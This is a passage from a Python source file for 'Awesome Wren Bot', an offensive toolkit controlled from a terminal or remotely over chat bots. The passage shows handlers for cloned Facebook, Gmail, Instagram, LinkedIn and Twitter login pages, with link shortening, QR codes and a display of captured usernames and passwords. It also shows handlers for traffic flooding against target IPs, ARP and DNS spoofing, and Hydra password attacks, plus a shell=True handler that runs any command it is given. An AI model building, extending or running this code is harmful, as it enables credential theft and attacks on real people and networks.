        result = self.nikto.scan(target, {'tuning': '5'})
        return {'success': result['success'], 'output': result.get('output', 'XSS scan completed')[:1000]}
    
    def _execute_nikto_cgi(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nikto_cgi <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'tuning': '2'})
        return {'success': result['success'], 'output': result.get('output', 'CGI scan completed')[:1000]}
    
    def _execute_generate_traffic(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: generate_traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        try:
            generator = self.traffic_gen.generate_traffic(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _execute_traffic_types(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic_gen.get_available_traffic_types()
        return {'success': True, 'output': "📡 Available Traffic Types:\n" + "\n".join([f"  • {t}" for t in types])}
    
    def _execute_traffic_status(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic_gen.get_active_generators()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "🚀 Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _execute_traffic_stop(self, args):
        if not self.traffic_gen:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic_gen.stop_generation(generator_id):
            return {'success': True, 'output': 'Traffic stopped' + (f' for {generator_id}' if generator_id else ' for all')}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _execute_traffic_logs(self, args):
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        logs = self.db.get_traffic_logs(limit)
        if not logs:
            return {'success': True, 'output': 'No traffic logs'}
        output = "📋 Traffic Logs:\n"
        for l in logs:
            output += f"  • {l['timestamp'][:19]} - {l['traffic_type']} to {l['target_ip']} ({l['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _execute_phishing(self, args, platform):
        result = self.social_tools.generate_phishing_link(platform)
        if result['success']:
            return {'success': True, 'output': f"🎣 Phishing link generated for {platform}\nLink ID: {result['link_id']}\nURL: {result['phishing_url']}\n\nUse: phishing_start_server {result['link_id']} to start the server"}
        return {'success': False, 'output': result.get('error', 'Failed to generate link')}
    
    def _execute_phishing_custom(self, args):
        custom_url = args[0] if args else None
        result = self.social_tools.generate_phishing_link('custom', custom_url)
        return {'success': result['success'], 'output': f"Link ID: {result.get('link_id', 'N/A')}" if result['success'] else result.get('error', 'Failed')}
    
    def _execute_phishing_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_start_server <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social_tools.start_phishing_server(link_id, port):
            url = self.social_tools.get_server_url()
            return {'success': True, 'output': f"🎣 Phishing server started on {url}"}
        return {'success': False, 'output': f'Failed to start server for link {link_id}'}
    
    def _execute_phishing_stop(self, args):
        self.social_tools.stop_phishing_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _execute_phishing_status(self, args):
        running = self.social_tools.phishing_server.running
        url = self.social_tools.get_server_url() if running else None
        output = f"🎣 Phishing Server Status: {'✅ Running' if running else '❌ Stopped'}"
        if running:
            output += f"\n   URL: {url}"
        return {'success': True, 'output': output}
    
    def _execute_phishing_links(self, args):
        links = self.social_tools.get_active_links()
        all_links = self.db.get_phishing_links()
        output = f"🎣 Phishing Links ({len(all_links)} total)\n"
        for l in all_links[:10]:
            active = '🟢' if any(al['link_id'] == l['id'] for al in links) else '⚪'
            output += f"  {active} {l['id'][:8]} - {l['platform']} ({l['clicks']} clicks)\n"
        return {'success': True, 'output': output}
    
    def _execute_phishing_credentials(self, args):
        link_id = args[0] if args else None
        creds = self.social_tools.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No credentials captured'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _execute_phishing_qr(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_qr <link_id>'}
        link_id = args[0]
        qr_path = self.social_tools.generate_qr_code(link_id)
        if qr_path:
            return {'success': True, 'output': f"QR Code generated: {qr_path}"}
        return {'success': False, 'output': f'Failed to generate QR code for {link_id}'}
    
    def _execute_phishing_shorten(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_shorten <link_id>'}
        link_id = args[0]
        short_url = self.social_tools.shorten_url(link_id)
        if short_url:
            return {'success': True, 'output': f"Shortened URL: {short_url}"}
        return {'success': False, 'output': f'Failed to shorten URL for {link_id}'}
    
    def _execute_api_create_key(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: api_create_key <name> <permissions>'}
        name = args[0]
        permissions = args[1].split(',')
        api_key = self.db.create_api_key(name, permissions)
        if api_key:
            return {'success': True, 'output': f"API Key created: {api_key}"}
        return {'success': False, 'output': 'Failed to create API key'}
    
    def _execute_api_list_keys(self, args):
        self.db.cursor.execute('SELECT name, id, created_at, active FROM api_keys')
        keys = self.db.cursor.fetchall()
        if not keys:
            return {'success': True, 'output': 'No API keys found'}
        output = "🔑 API Keys:\n"
        for k in keys:
            status = "🟢 Active" if k['active'] else "🔴 Inactive"
            output += f"  • {k['name']} ({k['id']}) - {status} - Created: {k['created_at'][:16]}\n"
        return {'success': True, 'output': output}
    
    def _execute_help(self, args):
        help_text = """
🐦 AWESOME WREN BOT v1.0.0 - HELP MENU

🎭 SPOOFING COMMANDS:
  spoof_ip <orig> <spoof> <target> [iface] - IP spoofing
  spoof_mac <iface> <mac> - MAC address spoofing
  arp_spoof <target> <spoof_ip> [iface] - ARP spoofing
  dns_spoof <domain> <ip> [iface] - DNS spoofing
  stop_spoof [id] - Stop all spoofing

🔌 SSH COMMANDS:
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list - List configured servers
  ssh_connect <id> - Connect to server
  ssh_exec <id> <command> - Execute command
  ssh_disconnect [id] - Disconnect

🚀 TRAFFIC GENERATION:
  generate_traffic <type> <ip> <duration> [port] [rate] - Generate real traffic
  traffic_types - List available types
  traffic_status - Check active generators
  traffic_stop [id] - Stop generation
  traffic_logs [limit] - View logs

🕷️ NIKTO WEB SCANNER:
  nikto <target> - Basic vulnerability scan
  nikto_full <target> - Full scan
  nikto_ssl <target> - SSL/TLS scan
  nikto_sql <target> - SQL injection scan
  nikto_xss <target> - XSS scan
  nikto_cgi <target> - CGI scan

🎣 SOCIAL ENGINEERING:
  generate_phishing_link_for_facebook - Facebook phishing
  generate_phishing_link_for_instagram - Instagram phishing
  generate_phishing_link_for_twitter - Twitter phishing
  generate_phishing_link_for_gmail - Gmail phishing
  generate_phishing_link_for_linkedin - LinkedIn phishing
  generate_phishing_link_for_custom - Custom phishing
  phishing_start_server <id> [port] - Start server
  phishing_stop_server - Stop server
  phishing_status - Check server status
  phishing_links - List all links
  phishing_credentials [id] - View captured data
  phishing_qr <id> - Generate QR code
  phishing_shorten <id> - Shorten URL

🛡️ NETWORK COMMANDS:
  ping <target> - Ping target
  scan <target> - Port scan (1-1000)
  quick_scan <target> - Quick port scan
  full_scan <target> - Full port scan
  nmap <target> [options] - Full nmap scan
  traceroute <target> - Trace route
  whois <domain> - WHOIS lookup
  dns <domain> - DNS lookup
  location <ip> - IP geolocation
  curl <url> - HTTP request
  wget <url> - Download file
  nc <host> <port> - Netcat connection

🔐 WORDLIST & HYDRA:
  wordlist_stats <id> - Analyze wordlist
  hydra <target> <service> -l <user> -P <wordlist> - Password attacks

📊 SYSTEM COMMANDS:
  time - Show current time
  date - Show current date
  datetime - Show both
  history [limit] - Command history
  time_history [limit] - Time command history
  status - System status
  threats - Recent threats
  report - Security report
  help - This help menu
  exit - Exit program

Examples:
  ping 8.8.8.8
  scan 192.168.1.1
  generate_traffic icmp 192.168.1.1 10
  spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1
  generate_phishing_link_for_facebook
  phishing_start_server abc12345 8080
  nikto example.com
  whois google.com
  api_create_key my_key "execute_commands,scan"
"""
        return {'success': True, 'output': help_text}
    
    def _execute_status(self, args):
        stats = self.db.get_statistics()
        threat_stats = self.db.get_threat_statistics()
        output = f"""
🐦 WREN BOT - System Status
{'='*50}
📊 Statistics:
  • Total Commands: {stats.get('total_commands', 0)}
  • Total Threats: {stats.get('total_threats', 0)}
  • SSH Servers: {stats.get('total_ssh_servers', 0)}
  • SSH Commands: {stats.get('total_ssh_commands', 0)}
  • Traffic Tests: {stats.get('total_traffic_tests', 0)}
  • Phishing Links: {stats.get('total_phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • Nikto Scans: {stats.get('total_nikto_scans', 0)}
  • Scan Results: {stats.get('total_scan_results', 0)}
  • Wordlists: {stats.get('total_wordlists', 0)}
  • API Keys: {stats.get('total_api_keys', 0)}

🚨 Threat Summary:
  • Critical: {threat_stats.get('severity_distribution', {}).get('critical', 0)}
  • High: {threat_stats.get('severity_distribution', {}).get('high', 0)}
  • Medium: {threat_stats.get('severity_distribution', {}).get('medium', 0)}
  • Low: {threat_stats.get('severity_distribution', {}).get('low', 0)}
"""
        return {'success': True, 'output': output}
    
    def _execute_threats(self, args):
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            output += f"  {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _execute_report(self, args):
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(5)
        report = f"""WREN BOT Security Report
Generated: {datetime.datetime.now().isoformat()}
Total Commands: {stats.get('total_commands', 0)}
Total Threats: {stats.get('total_threats', 0)}
Recent Threats:"""
        for t in threats:
            report += f"\n  - {t['threat_type']} from {t['source_ip']}"
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _execute_generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# MAIN APPLICATION
# =====================
class WrenBot:
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.ssh_manager = SSHManager(self.db, self.config) if PARAMIKO_AVAILABLE else None
        self.nikto = NiktoScanner(self.db, self.config)
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.spoof_engine = SpoofingEngine(self.db)
        self.social_tools = SocialEngineeringTools(self.db)
        self.wordlist_manager = WordlistManager(self.db)
        self.handler = CommandHandler(self.db, self.ssh_manager, self.nikto, self.traffic_gen, 
                                      self.spoof_engine, self.social_tools, self.wordlist_manager)
        self.discord_bot = DiscordBot(self.handler, self.db)
        self.telegram_bot = TelegramBot(self.handler, self.db)
        self.slack_bot = SlackBot(self.handler, self.db)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.db)
        self.imessage_bot = iMessageBot(self.handler, self.db)
        self.google_chat_bot = GoogleChatBot(self.handler, self.db)
        self.web_server = WebServer(self.handler, self.db, 8080)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.SECONDARY}        🐦 AWESOME WREN BOT v1.0.0    |    Multi-Platform Command Center      {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}  • 🔌 SSH Remote Command Execution      • 🎭 IP/MAC/ARP/DNS Spoofing          {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🚀 REAL Traffic Generation          • 🎣 Social Engineering Suite          {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🕷️ Nikto Web Scanner                • 📱 Multi-Platform Bot Support        {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🔒 IP Management & Threat Detection  • 📊 Advanced Threat Detection         {Colors.PRIMARY}║
║{Colors.ACCENT}  • 🌐 Web Interface (Port 8080)         • 🔑 API Management System             {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                    🎯 5000+ CYBERSECURITY COMMANDS                           {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}🔐 FEATURES: SSH | Spoofing | Traffic Gen | Phishing | Nikto | API | Web UI{Colors.RESET}
{Colors.ACCENT}💡 Type 'help' for commands | 🌐 Web: http://localhost:8080{Colors.RESET}
"""
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.SECONDARY}🔍 Checking dependencies...{Colors.RESET}")
        for tool in ['ping', 'nmap', 'curl', 'dig', 'whois', 'traceroute', 'ssh', 'hydra', 'arpspoof']:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}")
        print(f"{Colors.SUCCESS if QRCODE_AVAILABLE else Colors.WARNING}✅ qrcode{Colors.RESET}")
    
    def setup_bots(self):
        print(f"\n{Colors.SECONDARY}🤖 Bot Configuration{Colors.RESET}")
        setup = input(f"{Colors.ACCENT}Configure Discord? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Discord bot token: {Colors.RESET}").strip()
            if token:
                self.discord_bot.save_config(token, True)
                if self.discord_bot.setup():
                    self.discord_bot.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        setup = input(f"{Colors.ACCENT}Configure Telegram? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_id = input(f"{Colors.ACCENT}API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ACCENT}API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ACCENT}Bot Token: {Colors.RESET}").strip()
            if api_id and api_hash:
                self.telegram_bot.save_config(api_id, api_hash, bot_token, True)
                if self.telegram_bot.setup():
                    self.telegram_bot.start()
                    print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        setup = input(f"{Colors.ACCENT}Configure Slack? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ACCENT}Channel ID: {Colors.RESET}").strip()
            if token:
                self.slack_bot.save_config(token, channel, True)
                if self.slack_bot.setup():
                    self.slack_bot.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        self.web_server.start()
        self.setup_bots()
        print(f"\n{Colors.SUCCESS}✅ Awesome Wren Bot ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.ACCENT}   🌐 Web Interface: http://localhost:8080{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{self.session_id}] 🐦> {Colors.RESET}"
                command = input(prompt).strip()
                if command.lower() == 'exit':
                    self.running = False
                    print(f"{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                else:
                    result = self.handler.execute(command)
                    if result['success']:
                        print(result['output'])
                        print(f"{Colors.SUCCESS}✅ ({result['execution_time']:.2f}s){Colors.RESET}")
                    else:
                        print(f"{Colors.ERROR}❌ {result['output']}{Colors.RESET}")
            except KeyboardInterrupt:
                self.running = False
                print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
        
        self.web_server.stop()
        self.db.close()
        print(f"{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")

def main():
    try:
        print(f"{Colors.PRIMARY}🐦 Starting Awesome Wren Bot...{Colors.RESET}")
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        app = WrenBot()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()